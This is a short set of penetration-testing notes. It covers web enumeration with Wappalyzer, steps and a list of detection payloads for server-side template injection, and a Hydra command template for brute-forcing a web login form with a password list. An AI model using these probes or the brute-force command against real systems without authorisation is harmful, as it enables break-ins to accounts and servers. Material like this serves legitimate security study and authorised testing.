---
# the default layout is 'page'
icon: fas fa-info-circle
order: 4
---

# Enumeartion

## web

### wappalyzer

- used to identify website technologies
- install as browser extension via chrome web store

### ssti

1. fingerprint language used on server (i.e. python, php, js, nodejs, etc) 
2. find input field to test
3. using identified language as a guide, narrow down the payloads to try

- great writeup on [fingerprinting languages and template engines](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756) 

#### payloads

characters to test
```
${{<%[%'"}}%\.
```
common payloads to test
```
${7*7}
${{7*7}}
#{7*7}
#{ 7 * 7 }
*{7*7}
@{7*7}
~{7*7}
[[7*7]]
[[${7*7}]]
[(7*7)]
{7'*7'}
<%= 7 * 7 %>
<%7*7%>
```

[hacktricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) has a good bit of info on other payloads and their corresponding template engines too

# Tools

## hydra

- web form with username and password list

```
hydra -l [username] -P [path_to_passwd_list] -t 10 http-post-form [domain] "/URI:username=^USER^&password=^PASSWORD^:Cookie="
```